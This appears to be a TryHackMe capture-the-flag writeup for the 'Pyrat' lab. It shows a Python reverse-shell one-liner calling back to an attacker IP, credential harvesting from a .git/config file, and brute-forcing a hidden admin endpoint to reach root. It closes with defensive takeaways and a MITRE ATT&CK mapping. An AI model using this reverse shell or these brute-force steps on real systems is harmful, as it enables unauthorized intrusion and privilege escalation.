# 🐍 Pyrat: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `pyrat.thm` |
| **OS** | Ubuntu 20.04 (Linux 5.4.0) |
| **Attack Surface** | Python RAT on port 8000 — open Python REPL → reverse shell as `www-data` |
| **Privesc** | Git config credential leak → SSH as `think` → admin endpoint brute-force on RAT → root shell |

Pyrat runs a custom Python-based RAT on port 8000 that acts as an unauthenticated Python REPL. Sending a Python reverse shell one-liner drops a shell as `www-data`. Post-shell recon finds a Git credential file leaking `think`'s password. From `think`, the RAT's source code (recovered via `git reset`) reveals a hidden `admin` endpoint. Brute-forcing its password unlocks a privileged shell mode that runs as root.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 pyrat.thm -oA pyrat-tcp-scan
```

```
22/tcp   open  ssh    OpenSSH 8.2p1
8000/tcp open  ?      (custom service — Python RAT)
```

### RAT Recon

```bash
nc pyrat.thm 8000
print('hello')
# hello
```

The service executes arbitrary Python — it's a live REPL running as `www-data`.

---

## 💀 Initial Access — Python RAT Reverse Shell

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("10.14.28.97",5544))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])
```

```bash
nc -nlvp 5544 -s 10.14.28.97
# uid=33(www-data) gid=33(www-data)
```

Shell stabilised via socat for a full PTY.

---

## 🔁 Privilege Escalation — www-data → think

### Git Config Credential Leak

```bash
find / -type f -user think 2>/dev/null
# /opt/dev/.git/config
```

```bash
cat /opt/dev/.git/config
```

```
[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
```

```bash
ssh think@pyrat.thm
# password: _TH1NKINGPirate$_
```

---

## 🔁 Privilege Escalation — think → root

### RAT Source Code Recovery

```bash
cd /opt/dev
git reset --hard HEAD
cat pyrat.py.old
```

The old source reveals the routing logic — the RAT supports named endpoints. Sending `admin` prompts for a password. Sending `shell` from the admin context opens a privileged shell running as UID 0.

### Endpoint Fuzzing

A quick fuzzer confirmed the `admin` endpoint:

```bash
# Fuzz script sends words and checks responses
# Result: "admin" → responds with "Password:"
```

### Brute-Force Admin Password

Custom brute-force script against the admin endpoint:

```bash
./brute.py --host localhost --port 8000 --password-file ./xato-net-10-million-passwords-1000.txt
# [+] Tried: abc123  | Response: Welcome Admin!!! Type "shell" to begin
```

### Root Shell

```bash
nc localhost 8000
admin
# Password:
abc123
# Welcome Admin!!! Type "shell" to begin
shell
# cd /root
# cat root.txt
```

---

## 🗺️ Attack Chain

```
[Python RAT — port 8000]
    Unauthenticated Python REPL → reverse shell → www-data
          │
          ▼
[/opt/dev/.git/config]
    think:_TH1NKINGPirate$_ → SSH as think
          │
          ▼
[RAT Source — git reset --hard HEAD]
    Hidden "admin" endpoint discovered
    Password brute-forced: abc123
    "shell" command → root shell
```

---

## 📌 Key Takeaways

- An unauthenticated Python REPL exposed over TCP is unconditional RCE — the RAT design here has no auth, no sandbox, and runs as a web-accessible service account
- Git repositories on disk (including `.git/config`) regularly contain credentials; always check `/opt`, `/var`, and home directories for `.git` folders post-foothold
- Hidden endpoints in custom services can be discovered through source code review or brute-force; treating them as "security by obscurity" is not access control
- Single-word passwords like `abc123` break in seconds against any common wordlist regardless of the protocol

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Execution | Command and Scripting Interpreter: Python | [T1059.006](https://attack.mitre.org/techniques/T1059/006) |
| Credential Access | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `nc` | Connect to Python RAT REPL and receive reverse shell |
| `socat` | Full PTY shell stabilisation |
| `git` | Recover RAT source code via git reset --hard HEAD |
| `brute.py` | Custom brute-force script for RAT admin endpoint password |

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`TBD`

</details>

<details>
<summary><code>root.txt</code></summary>

`TBD`

</details>
